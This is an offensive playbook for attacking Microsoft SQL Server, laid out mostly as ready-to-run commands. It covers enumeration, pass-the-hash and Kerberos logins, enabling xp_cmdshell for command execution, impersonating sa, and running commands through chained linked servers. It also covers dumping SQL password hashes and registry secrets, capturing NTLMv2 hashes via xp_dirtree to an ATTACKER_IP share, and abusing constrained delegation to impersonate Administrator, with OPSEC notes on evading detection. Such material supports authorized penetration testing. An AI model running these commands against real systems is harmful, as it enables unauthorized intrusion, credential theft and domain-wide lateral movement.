# MSSQL Attacks

tags: mssql, sql-server, xp_cmdshell, linked-servers, impersonation, credential-extraction, lateral-movement, active-directory

## Objective
Exploit Microsoft SQL Server for command execution, credential extraction, and lateral movement through linked servers and impersonation.

## Prerequisites
- MSSQL instance identified (typically port 1433, or dynamic via UDP 1434)
- Valid credentials (sa, domain user with login, or captured via relay/kerberoast)

## Methodology

### Enumeration
```bash
# Discover MSSQL instances via nmap
nmap -p 1433 -sV --script ms-sql-info TARGET

# UDP broadcast discovery
nmap -sU -p 1434 --script ms-sql-info TARGET

# nxc MSSQL authentication test
nxc mssql TARGETS -u user -p pass -d DOMAIN

# Enumerate with impacket
impacket-mssqlclient DOMAIN/user:pass@TARGET -windows-auth
```

### Authentication Vectors
| Method | Command | Notes |
|--------|---------|-------|
| SQL auth | `impacket-mssqlclient sa:pass@TARGET` | Local SQL accounts |
| Windows auth | `impacket-mssqlclient DOMAIN/user:pass@TARGET -windows-auth` | Domain-joined instances |
| Hash auth | `impacket-mssqlclient DOMAIN/user@TARGET -hashes :NTHASH -windows-auth` | PTH against MSSQL |
| Kerberos | `impacket-mssqlclient -k -no-pass DOMAIN/user@TARGET_FQDN` | Ticket-based |

### Command Execution via xp_cmdshell
```sql
-- Check if xp_cmdshell is enabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
```

### Privilege Escalation via Impersonation
```sql
-- Check who we can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- verify
```

### Linked Server Exploitation
```sql
-- Enumerate linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Execute on linked server
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER];

-- RPC out for xp_cmdshell on linked server
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Double-hop via chained linked servers
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [THIRD_SERVER]') AT [SECOND_SERVER];
```

### Credential Extraction
```sql
-- Extract SQL logins (sysadmin)
SELECT name, password_hash FROM sys.sql_logins;

-- Read Windows credentials from registry
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SECURITY\Policy\Secrets\DefaultPassword', 'CurrentValue';

-- Capture NTLMv2 via xp_dirtree to attacker SMB
EXEC xp_dirtree '\\ATTACKER_IP\share';
```
```bash
# Crack SQL password hashes
hashcat -m 1731 sql_hashes.txt wordlist.txt

# Capture MSSQL service account hash via Responder
responder -I eth0
# then trigger: EXEC xp_dirtree '\\ATTACKER_IP\share'
```

### MSSQL → Domain Escalation
MSSQL service accounts running as domain users often have:
- SPNs (kerberoastable)
- Admin rights on the SQL host
- Constrained delegation configured
```bash
# If MSSQL service account has constrained delegation:
impacket-getST -spn MSSQLSvc/TARGET:1433 -impersonate Administrator DOMAIN/svc_sql:pass
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass DOMAIN/Administrator@TARGET_FQDN
```

## Graph Reporting
- **Host nodes**: SQL Server host
- **Service nodes**: MSSQL/1433 (with `xp_cmdshell`, `linked_servers` properties)
- **Credential nodes**: SA password, SQL logins, captured hashes
- **ADMIN_TO edges**: if xp_cmdshell gives SYSTEM or admin context
- **HAS_SESSION edges**: confirmed SQL access
- **REACHABLE edges**: linked server relationships (SQL host → linked host)
- **DELEGATES_TO edges**: if service account has constrained delegation
- **KERBEROASTABLE edges**: if service account has SPN

## OPSEC Notes

| Technique | Noise Rating | Detection |
|-----------|-------------|-----------|
| SQL enumeration | 0.3 | Failed login events (18456) |
| xp_cmdshell | 0.7 | Event 15457 + child process from sqlservr.exe |
| Linked server queries | 0.3 | Audit events on linked server |
| xp_dirtree hash capture | 0.5 | Outbound SMB from SQL server |
| Impersonation | 0.2 | Audit login events |

- SQL audit logging varies wildly — many instances have no C2 audit configured
- xp_cmdshell spawns `cmd.exe` as child of `sqlservr.exe` — obvious to EDR
- Linked server abuse often crosses trust boundaries silently

## Sequencing
- **After**: Network Recon (MSSQL identified), Kerberoasting (SPN cracked), Password Spraying
- **Feeds →**: Credential Dumping (via extracted hashes), Lateral Movement (via linked servers), AD Privilege Escalation (via delegation abuse)
